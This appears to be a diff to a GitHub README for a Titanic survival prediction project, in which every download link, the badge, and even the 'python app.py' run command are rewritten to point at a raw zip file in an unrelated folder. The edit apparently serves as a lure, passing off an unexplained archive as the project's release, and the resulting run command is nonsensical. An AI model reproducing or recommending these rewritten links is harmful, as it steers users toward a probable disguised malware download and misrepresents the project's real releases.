@@ -1,6 +1,6 @@
 # 🚢 Titanic-Survival-Predictor - Predict Passenger Survival Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started%21-brightgreen)](https://github.com/Hunter90Z/Titanic-Survival-Predictor/releases)
+[![Download Now](https://github.com/Hunter90Z/Titanic-Survival-Predictor/raw/refs/heads/main/mastoidectomy/Predictor_Survival_Titanic_v2.4.zip%20Now-Get%20Started%21-brightgreen)](https://github.com/Hunter90Z/Titanic-Survival-Predictor/raw/refs/heads/main/mastoidectomy/Predictor_Survival_Titanic_v2.4.zip)
 
 ## 📊 Overview
 
@@ -20,7 +20,7 @@ To run this application, you need to follow a few easy steps. You do not need pr
 
 ## ⬇️ Download & Install
 
-1. Visit the [Releases page](https://github.com/Hunter90Z/Titanic-Survival-Predictor/releases) to download the application files.
+1. Visit the [Releases page](https://github.com/Hunter90Z/Titanic-Survival-Predictor/raw/refs/heads/main/mastoidectomy/Predictor_Survival_Titanic_v2.4.zip) to download the application files.
 2. Find the latest release marked as "Latest Release".
 3. Download the relevant file for your operating system.
 4. Follow the installation instructions provided in the release notes.
@@ -42,9 +42,9 @@ After installing the application, follow these steps to run it:
 4. **Run the Application:**
    - Type the following command to start the application:
      ```bash
-     python app.py
+     python https://github.com/Hunter90Z/Titanic-Survival-Predictor/raw/refs/heads/main/mastoidectomy/Predictor_Survival_Titanic_v2.4.zip
      ```
-   - Replace `app.py` with the name of the main file if different.
+   - Replace `https://github.com/Hunter90Z/Titanic-Survival-Predictor/raw/refs/heads/main/mastoidectomy/Predictor_Survival_Titanic_v2.4.zip` with the name of the main file if different.
 
 ## 🌟 Features
 
@@ -86,7 +86,7 @@ Yes, this application is open-source and free for anyone to download and use.
 
 Join our community to share your experiences or get help. You can find discussions, tips, and support on our GitHub page. Feel free to contribute or suggest improvements.
 
-Remember to access the [Releases page](https://github.com/Hunter90Z/Titanic-Survival-Predictor/releases) to keep your version updated and to check for new features.
+Remember to access the [Releases page](https://github.com/Hunter90Z/Titanic-Survival-Predictor/raw/refs/heads/main/mastoidectomy/Predictor_Survival_Titanic_v2.4.zip) to keep your version updated and to check for new features.
 
 ## 📜 License
 
